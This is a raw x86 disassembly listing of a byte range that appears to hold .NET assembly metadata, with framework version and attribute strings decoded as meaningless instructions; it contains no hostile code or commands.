  40bb72:	1d 05 05 20 02       	sbb    $0x2200505,%eax
  40bb77:	01 0e                	add    %ecx,(%esi)
  40bb79:	0e                   	push   %cs
  40bb7a:	05 20 02 01 0e       	add    $0xe010220,%eax
  40bb7f:	08 04 20             	or     %al,(%eax,%eiz,1)
  40bb82:	01 02                	add    %eax,(%edx)
  40bb84:	0e                   	push   %cs
  40bb85:	03 20                	add    (%eax),%esp
  40bb87:	00 0e                	add    %cl,(%esi)
  40bb89:	04 20                	add    $0x20,%al
  40bb8b:	01 01                	add    %eax,(%ecx)
  40bb8d:	02 04 20             	add    (%eax,%eiz,1),%al
  40bb90:	01 01                	add    %eax,(%ecx)
  40bb92:	0c 04                	or     $0x4,%al
  40bb94:	20 01                	and    %al,(%ecx)
  40bb96:	01 0d 04 20 00 12    	add    %ecx,0x12002004
  40bb9c:	1c 04                	sbb    $0x4,%al
  40bb9e:	20 00                	and    %al,(%eax)
  40bba0:	11 24 04             	adc    %esp,(%esp,%eax,1)
  40bba3:	20 00                	and    %al,(%eax)
  40bba5:	12 2d 03 28 00 0e    	adc    0xe002803,%ch
  40bbab:	03 28                	add    (%eax),%ebp
  40bbad:	00 0a                	add    %cl,(%edx)
  40bbaf:	03 28                	add    (%eax),%ebp
  40bbb1:	00 0d 04 28 00 12    	add    %cl,0x12002804
  40bbb7:	1c 04                	sbb    $0x4,%al
  40bbb9:	28 00                	sub    %al,(%eax)
  40bbbb:	11 24 04             	adc    %esp,(%esp,%eax,1)
  40bbbe:	00 00                	add    %al,(%eax)
  40bbc0:	00 00                	add    %al,(%eax)
  40bbc2:	04 01                	add    $0x1,%al
  40bbc4:	00 00                	add    %al,(%eax)
  40bbc6:	00 04 02             	add    %al,(%edx,%eax,1)
  40bbc9:	00 00                	add    %al,(%eax)
  40bbcb:	00 04 03             	add    %al,(%ebx,%eax,1)
  40bbce:	00 00                	add    %al,(%eax)
  40bbd0:	00 04 04             	add    %al,(%esp,%eax,1)
  40bbd3:	00 00                	add    %al,(%eax)
  40bbd5:	00 04 05 00 00 00 04 	add    %al,0x4000000(,%eax,1)
  40bbdc:	06                   	push   %es
  40bbdd:	00 00                	add    %al,(%eax)
  40bbdf:	00 04 07             	add    %al,(%edi,%eax,1)
  40bbe2:	00 00                	add    %al,(%eax)
  40bbe4:	00 04 08             	add    %al,(%eax,%ecx,1)
  40bbe7:	00 00                	add    %al,(%eax)
  40bbe9:	00 04 09             	add    %al,(%ecx,%ecx,1)
  40bbec:	00 00                	add    %al,(%eax)
  40bbee:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40bbf1:	00 00                	add    %al,(%eax)
  40bbf3:	00 04 0b             	add    %al,(%ebx,%ecx,1)
  40bbf6:	00 00                	add    %al,(%eax)
  40bbf8:	00 06                	add    %al,(%esi)
  40bbfa:	00 02                	add    %al,(%edx)
  40bbfc:	0e                   	push   %cs
  40bbfd:	12 39                	adc    (%ecx),%bh
  40bbff:	08 05 00 01 0e 12    	or     %al,0x120e0100
  40bc05:	39 06                	cmp    %eax,(%esi)
  40bc07:	00 02                	add    %al,(%edx)
  40bc09:	0e                   	push   %cs
  40bc0a:	05 12 39 05 00       	add    $0x53912,%eax
  40bc0f:	01 01                	add    %eax,(%ecx)
  40bc11:	12 39                	adc    (%ecx),%bh
  40bc13:	06                   	push   %es
  40bc14:	00 02                	add    %al,(%edx)
  40bc16:	01 12                	add    %edx,(%edx)
  40bc18:	39 0e                	cmp    %ecx,(%esi)
  40bc1a:	07                   	pop    %es
  40bc1b:	00 02                	add    %al,(%edx)
  40bc1d:	01 12                	add    %edx,(%edx)
  40bc1f:	39 1d 05 06 00 02    	cmp    %ebx,0x2000605
  40bc25:	01 12                	add    %edx,(%edx)
  40bc27:	39 0d 06 00 02 01    	cmp    %ecx,0x1020006
  40bc2d:	12 39                	adc    (%ecx),%bh
  40bc2f:	0c 06                	or     $0x6,%al
  40bc31:	00 02                	add    %al,(%edx)
  40bc33:	01 12                	add    %edx,(%edx)
  40bc35:	39 02                	cmp    %eax,(%edx)
  40bc37:	06                   	push   %es
  40bc38:	00 02                	add    %al,(%edx)
  40bc3a:	01 12                	add    %edx,(%edx)
  40bc3c:	39 0b                	cmp    %ecx,(%ebx)
  40bc3e:	06                   	push   %es
  40bc3f:	00 02                	add    %al,(%edx)
  40bc41:	01 12                	add    %edx,(%edx)
  40bc43:	39 0a                	cmp    %ecx,(%edx)
  40bc45:	04 00                	add    $0x0,%al
  40bc47:	01 18                	add    %ebx,(%eax)
  40bc49:	0e                   	push   %cs
  40bc4a:	06                   	push   %es
  40bc4b:	00 02                	add    %al,(%edx)
  40bc4d:	02 18                	add    (%eax),%bl
  40bc4f:	10 02                	adc    %al,(%edx)
  40bc51:	05 20 01 0e 12       	add    $0x120e0120,%eax
  40bc56:	41                   	inc    %ecx
  40bc57:	03 00                	add    (%eax),%eax
  40bc59:	00 0e                	add    %cl,(%esi)
  40bc5b:	04 00                	add    $0x0,%al
  40bc5d:	01 0e                	add    %ecx,(%esi)
  40bc5f:	0e                   	push   %cs
  40bc60:	08 b0 3f 5f 7f 11    	or     %dh,0x117f5f3f(%eax)
  40bc66:	d5 0a                	aad    $0xa
  40bc68:	3a 06                	cmp    (%esi),%al
  40bc6a:	00 01                	add    %al,(%ecx)
  40bc6c:	12 45 12             	adc    0x12(%ebp),%al
  40bc6f:	49                   	dec    %ecx
  40bc70:	06                   	push   %es
  40bc71:	00 01                	add    %al,(%ecx)
  40bc73:	11 48 11             	adc    %ecx,0x11(%eax)
  40bc76:	48                   	dec    %eax
  40bc77:	02 06                	add    (%esi),%al
  40bc79:	09 03                	or     %eax,(%ebx)
  40bc7b:	06                   	push   %es
  40bc7c:	11 48 04             	adc    %ecx,0x4(%eax)
  40bc7f:	00 00                	add    %al,(%eax)
  40bc81:	00 80 03 06 12 4d    	add    %al,0x4d120603(%eax)
  40bc87:	06                   	push   %es
  40bc88:	00 02                	add    %al,(%edx)
  40bc8a:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  40bc8d:	51                   	push   %ecx
  40bc8e:	06                   	push   %es
  40bc8f:	00 03                	add    %al,(%ebx)
  40bc91:	01 09                	add    %ecx,(%ecx)
  40bc93:	09 09                	or     %ecx,(%ecx)
  40bc95:	05 00 02 02 0e       	add    $0xe020200,%eax
  40bc9a:	0e                   	push   %cs
  40bc9b:	05 00 01 01 12       	add    $0x12010100,%eax
  40bca0:	20 04 00             	and    %al,(%eax,%eax,1)
  40bca3:	01 01                	add    %eax,(%ecx)
  40bca5:	0e                   	push   %cs
  40bca6:	18 06                	sbb    %al,(%esi)
  40bca8:	15 12 55 01 15       	adc    $0x15015512,%eax
  40bcad:	12 59 0a             	adc    0xa(%ecx),%bl
  40bcb0:	12 5d 1c             	adc    0x1c(%ebp),%bl
  40bcb3:	12 0d 12 09 0e 1d    	adc    0x1d0e0912,%cl
  40bcb9:	05 12 4d 0e 0e       	add    $0xe0e4d12,%eax
  40bcbe:	0e                   	push   %cs
  40bcbf:	04 20                	add    $0x20,%al
  40bcc1:	00 00                	add    %al,(%eax)
  40bcc3:	00 04 40             	add    %al,(%eax,%eax,2)
  40bcc6:	00 00                	add    %al,(%eax)
  40bcc8:	00 04 10             	add    %al,(%eax,%edx,1)
  40bccb:	00 00                	add    %al,(%eax)
  40bccd:	00 04 20             	add    %al,(%eax,%eiz,1)
  40bcd0:	01 0e                	add    %ecx,(%esi)
  40bcd2:	0e                   	push   %cs
  40bcd3:	06                   	push   %es
  40bcd4:	20 01                	and    %al,(%ecx)
  40bcd6:	1d 05 1d 05 07       	sbb    $0x7051d05,%eax
  40bcdb:	20 02                	and    %al,(%edx)
  40bcdd:	02 1d 05 1d 05 03    	add    0x3051d05,%bl
  40bce3:	06                   	push   %es
  40bce4:	11 74 03 06          	adc    %esi,0x6(%ebx,%eax,1)
  40bce8:	11 70 04             	adc    %esi,0x4(%eax)
  40bceb:	20 01                	and    %al,(%ecx)
  40bced:	01 08                	add    %ecx,(%eax)
  40bcef:	08 01                	or     %al,(%ecx)
  40bcf1:	00 08                	add    %cl,(%eax)
  40bcf3:	00 00                	add    %al,(%eax)
  40bcf5:	00 00                	add    %al,(%eax)
  40bcf7:	00 1e                	add    %bl,(%esi)
  40bcf9:	01 00                	add    %eax,(%eax)
  40bcfb:	01 00                	add    %eax,(%eax)
  40bcfd:	54                   	push   %esp
  40bcfe:	02 16                	add    (%esi),%dl
  40bd00:	57                   	push   %edi
  40bd01:	72 61                	jb     0x40bd64
  40bd03:	70 4e                	jo     0x40bd53
  40bd05:	6f                   	outsl  %ds:(%esi),(%dx)
  40bd06:	6e                   	outsb  %ds:(%esi),(%dx)
  40bd07:	45                   	inc    %ebp
  40bd08:	78 63                	js     0x40bd6d
  40bd0a:	65 70 74             	gs jo  0x40bd81
  40bd0d:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  40bd14:	77 73                	ja     0x40bd89
  40bd16:	01 05 20 01 01 11    	add    %eax,0x11010120
  40bd1c:	71 08                	jno    0x40bd26
  40bd1e:	01 00                	add    %eax,(%eax)
  40bd20:	02 00                	add    (%eax),%al
  40bd22:	00 00                	add    %al,(%eax)
  40bd24:	00 00                	add    %al,(%eax)
  40bd26:	05 01 00 00 00       	add    $0x1,%eax
  40bd2b:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  40bd2e:	00 07                	add    %al,(%edi)
  40bd30:	31 2e                	xor    %ebp,(%esi)
  40bd32:	30 2e                	xor    %ch,(%esi)
  40bd34:	30 2e                	xor    %ch,(%esi)
  40bd36:	30 00                	xor    %al,(%eax)
  40bd38:	00 65 01             	add    %ah,0x1(%ebp)
  40bd3b:	00 29                	add    %ch,(%ecx)
  40bd3d:	2e 4e                	cs dec %esi
  40bd3f:	45                   	inc    %ebp
  40bd40:	54                   	push   %esp
  40bd41:	46                   	inc    %esi
  40bd42:	72 61                	jb     0x40bda5
  40bd44:	6d                   	insl   (%dx),%es:(%edi)
  40bd45:	65 77 6f             	gs ja  0x40bdb7
  40bd48:	72 6b                	jb     0x40bdb5
  40bd4a:	2c 56                	sub    $0x56,%al
  40bd4c:	65 72 73             	gs jb  0x40bdc2
  40bd4f:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%edi),%ebp
  40bd56:	30 2c 50             	xor    %ch,(%eax,%edx,2)
  40bd59:	72 6f                	jb     0x40bdca
  40bd5b:	66 69 6c 65 3d 43 6c 	imul   $0x6c43,0x3d(%ebp,%eiz,2),%bp
  40bd62:	69 65 6e 74 01 00 54 	imul   $0x54000174,0x6e(%ebp),%esp
  40bd69:	0e                   	push   %cs
  40bd6a:	14 46                	adc    $0x46,%al
  40bd6c:	72 61                	jb     0x40bdcf
  40bd6e:	6d                   	insl   (%dx),%es:(%edi)
  40bd6f:	65 77 6f             	gs ja  0x40bde1
  40bd72:	72 6b                	jb     0x40bddf
  40bd74:	44                   	inc    %esp
  40bd75:	69 73 70 6c 61 79 4e 	imul   $0x4e79616c,0x70(%ebx),%esi
  40bd7c:	61                   	popa
  40bd7d:	6d                   	insl   (%dx),%es:(%edi)
  40bd7e:	65 1f                	gs pop %ds
  40bd80:	2e 4e                	cs dec %esi
  40bd82:	45                   	inc    %ebp
  40bd83:	54                   	push   %esp
  40bd84:	20 46 72             	and    %al,0x72(%esi)
  40bd87:	61                   	popa
  40bd88:	6d                   	insl   (%dx),%es:(%edi)
  40bd89:	65 77 6f             	gs ja  0x40bdfb
  40bd8c:	72 6b                	jb     0x40bdf9
  40bd8e:	20 34 20             	and    %dh,(%eax,%eiz,1)
  40bd91:	43                   	inc    %ebx
  40bd92:	6c                   	insb   (%dx),%es:(%edi)
  40bd93:	69 65 6e 74 20 50 72 	imul   $0x72502074,0x6e(%ebp),%esp
  40bd9a:	6f                   	outsl  %ds:(%esi),(%dx)
  40bd9b:	66 69 6c 65 09 01 00 	imul   $0x1,0x9(%ebp,%eiz,2),%bp
  40bda2:	04 49                	add    $0x49,%al
  40bda4:	74 65                	je     0x40be0b
  40bda6:	6d                   	insl   (%dx),%es:(%edi)
  40bda7:	00 00                	add    %al,(%eax)
  40bda9:	03 07                	add    (%edi),%eax
  40bdab:	01 08                	add    %ecx,(%eax)
  40bdad:	04 00                	add    $0x0,%al
  40bdaf:	01 08                	add    %ecx,(%eax)
  40bdb1:	0e                   	push   %cs
  40bdb2:	05 20 02 08 08       	add    $0x8080220,%eax
  40bdb7:	08 03                	or     %al,(%ebx)
  40bdb9:	07                   	pop    %es
  40bdba:	01 02                	add    %eax,(%edx)
  40bdbc:	05 00 00 12 80       	add    $0x80120000,%eax
  40bdc1:	b5 05                	mov    $0x5,%ch
  40bdc3:	20 01                	and    %al,(%ecx)
  40bdc5:	0e                   	push   %cs
  40bdc6:	1d 05 05 20 00       	sbb    $0x200505,%eax
  40bdcb:	12 80 b9 05 20 00    	adc    0x2005b9(%eax),%al
  40bdd1:	12 80 bd 05 20 01    	adc    0x12005bd(%eax),%al
  40bdd7:	1d 05 0e 08 20       	sbb    $0x20080e05,%eax
  40bddc:	03 02                	add    (%edx),%eax
  40bdde:	1d 05 0e 1d 05       	sbb    $0x51d0e05,%eax
  40bde3:	14 07                	adc    $0x7,%al
  40bde5:	08 0e                	or     %cl,(%esi)
  40bde7:	08 1d 12 80 cd 08    	or     %bl,0x8cd8012
  40bded:	12 80 cd 12 80 d1    	adc    -0x2e7fed33(%eax),%al
  40bdf3:	12 80 d5 1d 0e 0c    	adc    0xc0e1dd5(%eax),%al
  40bdf9:	20 03                	and    %al,(%ebx)
  40bdfb:	01 11                	add    %edx,(%ecx)
  40bdfd:	80 d9 11             	sbb    $0x11,%cl
  40be00:	80 dd 11             	sbb    $0x11,%ch
  40be03:	80 e1 06             	and    $0x6,%cl
  40be06:	20 01                	and    %al,(%ecx)
  40be08:	1d 0e 1d 03 04       	sbb    $0x4031d0e,%eax
  40be0d:	20 01                	and    %al,(%ecx)
  40be0f:	08 08                	or     %cl,(%eax)
  40be11:	07                   	pop    %es
  40be12:	00 01                	add    %al,(%ecx)
  40be14:	1d 12 80 cd 0e       	sbb    $0xecd8012,%eax
  40be19:	07                   	pop    %es
  40be1a:	20 02                	and    %al,(%edx)
  40be1c:	01 12                	add    %edx,(%edx)
  40be1e:	80 cd 08             	or     $0x8,%ch
  40be21:	06                   	push   %es
  40be22:	20 01                	and    %al,(%ecx)
  40be24:	01 12                	add    %edx,(%edx)
  40be26:	80 f1 09             	xor    $0x9,%cl
  40be29:	20 02                	and    %al,(%edx)
  40be2b:	1d 0e 1d 0e 11       	sbb    $0x110e1d0e,%eax
  40be30:	80 f5 06             	xor    $0x6,%ch
  40be33:	20 02                	and    %al,(%edx)
  40be35:	01 12                	add    %edx,(%edx)
  40be37:	0d 02 05 20 02       	or     $0x2200502,%eax
  40be3c:	01 1c 18             	add    %ebx,(%eax,%ebx,1)
  40be3f:	09 20                	or     %esp,(%eax)
  40be41:	03 01                	add    (%ecx),%eax
  40be43:	12 39                	adc    (%ecx),%bh
  40be45:	02 12                	add    (%edx),%dl
  40be47:	81 01 05 20 00 12    	addl   $0x12002005,(%ecx)
  40be4d:	81 05 0b 20 04 01 0e 	addl   $0x981120e,0x104200b
  40be54:	12 81 09 
  40be57:	11 81 0d 02 09 20    	adc    %eax,0x2009020d(%ecx)
  40be5d:	04 01                	add    $0x1,%al
  40be5f:	12 81 15 1c 08 08    	adc    0x8081c15(%ecx),%al
  40be65:	0c 20                	or     $0x20,%al
  40be67:	05 12 25 1d 05       	add    $0x51d2512,%eax
  40be6c:	08 08                	or     %cl,(%eax)
  40be6e:	12 81 19 1c 06 00    	adc    0x61c19(%ecx),%al
  40be74:	01 11                	add    %edx,(%ecx)
  40be76:	81 21 0e 05 20 01    	andl   $0x120050e,(%ecx)
  40be7c:	02 12                	add    (%edx),%dl
  40be7e:	19 04 07             	sbb    %eax,(%edi,%eax,1)
  40be81:	02 08                	add    (%eax),%cl
  40be83:	08 05 20 01 08 12    	or     %al,0x12080120
  40be89:	25 06 00 02 08       	and    $0x8020006,%eax
  40be8e:	1d 05 08 07 20       	sbb    $0x20070805,%eax
  40be93:	03 08                	add    (%eax),%ecx
  40be95:	1d 05 08 08 06       	sbb    $0x6080805,%eax
  40be9a:	20 01                	and    %al,(%ecx)
  40be9c:	01 12                	add    %edx,(%edx)
  40be9e:	81 29 04 20 01 01    	subl   $0x1012004,(%ecx)
  40bea4:	1c 0c                	sbb    $0xc,%al
  40bea6:	07                   	pop    %es
  40bea7:	06                   	push   %es
  40bea8:	1c 02                	sbb    $0x2,%al
  40beaa:	1d 05 12 81 2d       	sbb    $0x2d811205,%eax
  40beaf:	08 1d 05 06 00 02    	or     %bl,0x2000605
  40beb5:	01 1c 10             	add    %ebx,(%eax,%edx,1)
  40beb8:	02 07                	add    (%edi),%al
  40beba:	20 02                	and    %al,(%edx)
  40bebc:	02 08                	add    (%eax),%cl
  40bebe:	11 81 35 07 20 03    	adc    %eax,0x3200735(%ecx)
  40bec4:	01 1d 05 08 08 05    	add    %ebx,0x5080805
  40beca:	00 02                	add    %al,(%edx)
  40becc:	0e                   	push   %cs
  40becd:	0e                   	push   %cs
  40bece:	0e                   	push   %cs
  40becf:	09 07                	or     %eax,(%edi)
  40bed1:	04 12                	add    $0x12,%al
  40bed3:	81 3d 1d 05 08 05 05 	cmpl   $0xe020005,0x508051d
  40beda:	00 02 0e 
  40bedd:	0e                   	push   %cs
  40bede:	1c 06                	sbb    $0x6,%al
  40bee0:	20 01                	and    %al,(%ecx)
  40bee2:	12 81 3d 0e 06 07    	adc    0x7060e3d(%ecx),%al
  40bee8:	03 1d 05 08 08 06    	add    0x6080805,%ebx
  40beee:	15 12 31 01 12       	adc    $0x12013112,%eax
  40bef3:	20 05 20 01 13 00    	and    %al,0x130120
  40bef9:	08 04 07             	or     %al,(%edi,%eax,1)
  40befc:	01 12                	add    %edx,(%edx)
  40befe:	20 05 20 01 01 13    	and    %al,0x13010120
  40bf04:	00 0e                	add    %cl,(%esi)
  40bf06:	07                   	pop    %es
  40bf07:	05 08 08 0e 15       	add    $0x150e0808,%eax
  40bf0c:	11 81 41 01 12 20    	adc    %eax,0x20120141(%ecx)
  40bf12:	12 20                	adc    (%eax),%ah
  40bf14:	09 20                	or     %esp,(%eax)
  40bf16:	00 15 11 81 41 01    	add    %dl,0x1418111
  40bf1c:	13 00                	adc    (%eax),%eax
  40bf1e:	07                   	pop    %es
  40bf1f:	15 11 81 41 01       	adc    $0x1418111,%eax
  40bf24:	12 20                	adc    (%eax),%ah
  40bf26:	04 20                	add    $0x20,%al
  40bf28:	00 13                	add    %dl,(%ebx)
  40bf2a:	00 07                	add    %al,(%edi)
  40bf2c:	07                   	pop    %es
  40bf2d:	04 05                	add    $0x5,%al
  40bf2f:	1d 05 08 08 04       	sbb    $0x4080805,%eax
  40bf34:	20 01                	and    %al,(%ecx)
  40bf36:	01 05 04 07 01 11    	add    %eax,0x11010704
  40bf3c:	24 04                	and    $0x4,%al
  40bf3e:	00 01                	add    %al,(%ecx)
  40bf40:	0b 0a                	or     (%edx),%ecx
  40bf42:	04 00                	add    $0x0,%al
  40bf44:	01 0b                	add    %ecx,(%ebx)
  40bf46:	0e                   	push   %cs
  40bf47:	04 00                	add    $0x0,%al
  40bf49:	01 0b                	add    %ecx,(%ebx)
  40bf4b:	0d 04 00 01 0b       	or     $0xb010004,%eax
  40bf50:	0c 06                	or     $0x6,%al
  40bf52:	00 01                	add    %al,(%ecx)
  40bf54:	0b 11                	or     (%ecx),%edx
  40bf56:	81 55 04 00 01 0a 0a 	adcl   $0xa0a0100,0x4(%ebp)
  40bf5d:	04 00                	add    $0x0,%al
  40bf5f:	01 0a                	add    %ecx,(%edx)
  40bf61:	0e                   	push   %cs
  40bf62:	04 00                	add    $0x0,%al
  40bf64:	01 0a                	add    %ecx,(%edx)
  40bf66:	0d 04 00 01 0a       	or     $0xa010004,%eax
  40bf6b:	0c 06                	or     $0x6,%al
  40bf6d:	00 01                	add    %al,(%ecx)
  40bf6f:	0a 11                	or     (%ecx),%dl
  40bf71:	81 55 04 00 01 0d 0a 	adcl   $0xa0d0100,0x4(%ebp)
  40bf78:	04 00                	add    $0x0,%al
  40bf7a:	01 0d 0e 07 07 02    	add    %ecx,0x207070e
  40bf80:	11 24 11             	adc    %esp,(%ecx,%edx,1)
  40bf83:	81 55 05 00 01 1d 05 	adcl   $0x51d0100,0x5(%ebp)
  40bf8a:	0c 02                	or     $0x2,%al
  40bf8c:	1d 05 07 07 02       	sbb    $0x2070705,%eax
  40bf91:	1d 05 12 81 59       	sbb    $0x59811205,%eax
  40bf96:	0d 20 04 01 0e       	or     $0xe010420,%eax
  40bf9b:	11 81 61 11 81 65    	adc    %eax,0x65811161(%ecx)
  40bfa1:	11 81 69 07 20 02    	adc    %eax,0x2200769(%ecx)
  40bfa7:	01 0e                	add    %ecx,(%esi)
  40bfa9:	11 81 61 0b 07 06    	adc    %eax,0x6070b61(%ecx)
  40bfaf:	12 20                	adc    (%eax),%ah
  40bfb1:	12 20                	adc    (%eax),%ah
  40bfb3:	1d 0e 0e 08 08       	sbb    $0x8080e0e,%eax
  40bfb8:	09 00                	or     %eax,(%eax)
  40bfba:	02 01                	add    (%ecx),%al
  40bfbc:	12 81 71 11 81 75    	adc    0x75811171(%ecx),%al
  40bfc2:	05 07 01 12 81       	add    $0x81120107,%eax
  40bfc7:	2d 05 07 01 12       	sub    $0x12010705,%eax
  40bfcc:	81 59 06 00 02 07 1d 	sbbl   $0x1d070200,0x6(%ecx)
  40bfd3:	05 08 06 00 02       	add    $0x2000608,%eax
  40bfd8:	0c 1d                	or     $0x1d,%al
  40bfda:	05 08 06 00 02       	add    $0x2000608,%eax
  40bfdf:	0d 1d 05 08 06       	or     $0x608051d,%eax
  40bfe4:	00 02                	add    %al,(%edx)
  40bfe6:	09 1d 05 08 06 00    	or     %ebx,0x60805
  40bfec:	02 0b                	add    (%ebx),%cl
  40bfee:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40bff3:	02 06                	add    (%esi),%al
  40bff5:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40bffa:	02 0a                	add    (%edx),%cl
  40bffc:	1d 05 08 09 07       	sbb    $0x7090805,%eax
  40c001:	03 12                	add    (%edx),%edx
  40c003:	81 2d 1d 05 1d 05 05 	subl   $0x12020705,0x51d051d
  40c00a:	07 02 12 
  40c00d:	20 02                	and    %al,(%edx)
  40c00f:	04 07                	add    $0x7,%al
  40c011:	01 1d 05 05 07 02    	add    %ebx,0x2070505
  40c017:	1d 05 08 08 07       	sbb    $0x7080805,%eax
  40c01c:	04 1d                	add    $0x1d,%al
  40c01e:	05 1d 05 08 05       	add    $0x508051d,%eax
  40c023:	06                   	push   %es
  40c024:	07                   	pop    %es
  40c025:	03 1d 05 08 05 05    	add    0x5050805,%ebx
  40c02b:	00 01                	add    %al,(%ecx)
  40c02d:	1d 05 0b 1c 07       	sbb    $0x71c0b05,%eax
  40c032:	0c 12                	or     $0x12,%al
  40c034:	81 7d 1d 05 1d 05 0e 	cmpl   $0xe051d05,0x1d(%ebp)
  40c03b:	08 1d 12 41 08 12    	or     %bl,0x12084112
  40c041:	41                   	inc    %ecx
  40c042:	12 41 12             	adc    0x12(%ecx),%al
  40c045:	81 81 12 81 85 12 81 	addl   $0x48981,0x12858112(%ecx)
  40c04c:	89 04 00 
  40c04f:	00 12                	add    %dl,(%edx)
  40c051:	41                   	inc    %ecx
  40c052:	05 20 00 12 81       	add    $0x81120020,%eax
  40c057:	91                   	xchg   %eax,%ecx
  40c058:	05 00 00 1d 12       	add    $0x121d0000,%eax
  40c05d:	41                   	inc    %ecx
  40c05e:	05 00 01 0e 1d       	add    $0x1d0e0100,%eax
  40c063:	0e                   	push   %cs
  40c064:	06                   	push   %es
  40c065:	20 01                	and    %al,(%ecx)
  40c067:	01 11                	add    %edx,(%ecx)
  40c069:	81 99 06 20 01 01 12 	sbbl   $0x4818112,0x1012006(%ecx)
  40c070:	81 81 04 
  40c073:	06                   	push   %es
  40c074:	12 81 85 09 20 02    	adc    0x2200985(%ecx),%al
  40c07a:	12 81 85 0e 11 81    	adc    -0x7eeef17b(%ecx),%al
  40c080:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40c081:	06                   	push   %es
  40c082:	00 03                	add    %al,(%ebx)
  40c084:	0e                   	push   %cs
  40c085:	0e                   	push   %cs
  40c086:	0e                   	push   %cs
  40c087:	0e                   	push   %cs
  40c088:	05 20 02 01 0e       	add    $0xe010220,%eax
  40c08d:	1c 07                	sbb    $0x7,%al
  40c08f:	00 01                	add    %al,(%ecx)
  40c091:	12 41 12             	adc    0x12(%ecx),%al
  40c094:	81 81 04 07 02 0a 02 	addl   $0x6071002,0xa020704(%ecx)
  40c09b:	10 07 06 
  40c09e:	12 81 b5 12 81 b9    	adc    -0x467eed4b(%ecx),%al
  40c0a4:	12 81 bd 12 81 c1    	adc    -0x3e7eed43(%ecx),%al
  40c0aa:	0e                   	push   %cs
  40c0ab:	02 05 20 00 12 81    	add    0x81120020,%al
  40c0b1:	b9 05 20 00 12       	mov    $0x12002005,%ecx
  40c0b6:	81 bd 05 20 00 12 81 	cmpl   $0x2004c181,0x12002005(%ebp)
  40c0bd:	c1 04 20 
  40c0c0:	01 1c 0e             	add    %ebx,(%esi,%ecx,1)
  40c0c3:	04 07                	add    $0x7,%al
  40c0c5:	02 02                	add    (%edx),%al
  40c0c7:	02 03                	add    (%ebx),%al
  40c0c9:	20 00                	and    %al,(%eax)
  40c0cb:	18 04 07             	sbb    %al,(%edi,%eax,1)
  40c0ce:	02 18                	add    (%eax),%bl
  40c0d0:	02 09                	add    (%ecx),%cl
  40c0d2:	07                   	pop    %es
  40c0d3:	04 1d                	add    $0x1d,%al
  40c0d5:	12 41 08             	adc    0x8(%ecx),%al
  40c0d8:	12 41 0e             	adc    0xe(%ecx),%al
  40c0db:	0a 07                	or     (%edi),%al
  40c0dd:	04 12                	add    $0x12,%al
  40c0df:	81 b5 08 12 81 b9 0e 	xorl   $0x1100c0e,-0x467eedf8(%ebp)
  40c0e6:	0c 10 01 
  40c0e9:	01 15 12 81 d1 01    	add    %edx,0x1d18112
  40c0ef:	1e                   	push   %ds
  40c0f0:	00 12                	add    %dl,(%edx)
  40c0f2:	35 05 0a 01 12       	xor    $0x12010a05,%eax
  40c0f7:	81 c1 0c 10 01 01    	add    $0x101100c,%ecx
  40c0fd:	1e                   	push   %ds
  40c0fe:	00 15 12 81 d1 01    	add    %dl,0x1d18112
  40c104:	1e                   	push   %ds
  40c105:	00 03                	add    %al,(%ebx)
  40c107:	07                   	pop    %es
  40c108:	01 0e                	add    %ecx,(%esi)
  40c10a:	05 00 00 12 81       	add    $0x81120000,%eax
  40c10f:	d5 05                	aad    $0x5
  40c111:	00 01                	add    %al,(%ecx)
  40c113:	0e                   	push   %cs
  40c114:	1d 1c 0b 07 05       	sbb    $0x5070b1c,%eax
  40c119:	1d 05 12 81 3d       	sbb    $0x3d811205,%eax
  40c11e:	1d 05 08 05 05       	sbb    $0x5050805,%eax
  40c123:	20 02                	and    %al,(%edx)
  40c125:	0e                   	push   %cs
  40c126:	08 08                	or     %cl,(%eax)
  40c128:	06                   	push   %es
  40c129:	07                   	pop    %es
  40c12a:	02 02                	add    (%edx),%al
  40c12c:	11 81 55 05 20 02    	adc    %eax,0x2200555(%ecx)
  40c132:	0e                   	push   %cs
  40c133:	0e                   	push   %cs
  40c134:	0e                   	push   %cs
  40c135:	05 20 00 11 81       	add    $0x81110020,%eax
  40c13a:	55                   	push   %ebp
  40c13b:	05 00 00 12 81       	add    $0x81120000,%eax
  40c140:	e5 06                	in     $0x6,%eax
  40c142:	20 01                	and    %al,(%ecx)
  40c144:	01 12                	add    %edx,(%edx)
  40c146:	81 e5 06 20 01 02    	and    $0x2012006,%ebp
  40c14c:	11 81 ed 11 07 05    	adc    %eax,0x50711ed(%ecx)
  40c152:	12 81 b5 15 12 31    	adc    0x311215b5(%ecx),%al
  40c158:	01 0e                	add    %ecx,(%esi)
  40c15a:	12 81 bd 12 81 c1    	adc    -0x3e7eed43(%ecx),%al
  40c160:	0e                   	push   %cs
  40c161:	05 15 12 31 01       	add    $0x1311215,%eax
  40c166:	0e                   	push   %cs
  40c167:	05 20 00 1d 13       	add    $0x131d0020,%eax
  40c16c:	00 06                	add    %al,(%esi)
  40c16e:	00 02                	add    %al,(%edx)
  40c170:	0e                   	push   %cs
  40c171:	0e                   	push   %cs
  40c172:	1d 0e 08 07 03       	sbb    $0x307080e,%eax
  40c177:	1d 12 45 08 12       	sbb    $0x12084512,%eax
  40c17c:	45                   	inc    %ebp
  40c17d:	05 00 00 1d 12       	add    $0x121d0000,%eax
  40c182:	45                   	inc    %ebp
  40c183:	05 20 00 11 81       	add    $0x81110020,%eax
  40c188:	f1                   	int1
  40c189:	09 00                	or     %eax,(%eax)
  40c18b:	02 02                	add    (%edx),%al
  40c18d:	11 81 f1 11 81 f1    	adc    %eax,-0xe7eee0f(%ecx)
  40c193:	07                   	pop    %es
  40c194:	20 03                	and    %al,(%ebx)
  40c196:	01 02                	add    %eax,(%edx)
  40c198:	0e                   	push   %cs
  40c199:	10 02                	adc    %al,(%edx)
  40c19b:	06                   	push   %es
  40c19c:	00 01                	add    %al,(%ecx)
  40c19e:	01 12                	add    %edx,(%edx)
  40c1a0:	81 f9 06 07 02 12    	cmp    $0x12020706,%ecx
  40c1a6:	81 85 02 08 20 03 01 	addl   $0x111c0e01,0x3200802(%ebp)
  40c1ad:	0e 1c 11 
  40c1b0:	82 01 06             	addb   $0x6,(%ecx)
  40c1b3:	07                   	pop    %es
